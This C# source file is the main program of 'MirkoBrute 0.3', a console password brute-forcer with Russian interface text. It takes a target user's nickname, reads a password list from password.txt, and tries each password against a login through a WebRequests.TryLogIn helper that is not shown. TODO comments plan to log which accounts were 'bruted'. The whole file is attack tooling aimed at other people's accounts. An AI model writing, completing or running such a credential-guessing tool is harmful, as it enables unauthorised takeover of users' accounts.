using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace MirkoBrute
{
    class Program
    {
        private static string Path = @"password.txt";
        static void Main(string[] args)
        {
            Console.Title = "Mirkobrute 0.3";
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("Добро пожаловать в тестовую версию программы \"MirkoBrute\".");
            Console.WriteLine("Для начала введите никнейм желаемой к перебору персоны.");
            Console.Write("\n>> ");
            Console.ForegroundColor = ConsoleColor.Green;
            string Nickname = Console.ReadLine();
            Console.WriteLine("USER: " + Nickname + ", начинаем брут!");
            if (!File.Exists(Path))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Не найдена база паролей! Пожалуйста, загрузите базу паролей прежде чем начинать брут.");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("Для выхода из программы нажмите любую клавишу.");
            }
            try
            {
                using (StreamReader sr = new StreamReader(Path, System.Text.Encoding.Default))
                {
                    string line;
                    while ((line = sr.ReadLine()) != null)
                    {
                        string request = WebRequests.TryLogIn(Nickname, line);
                        //TODO: Сделать тут вместо вывода проверку JSON-тела ответа
                        //TODO: Вывод забрученных и не забрученных аккаунтов в логи
                        Console.WriteLine(request);
                    }
                }
            }
            catch (Exception e)
            {
                //TODO: Сделать нормальный вывод ошибок в логи
                Console.WriteLine(e);
                Console.ReadKey();
            }
        }
    }
}
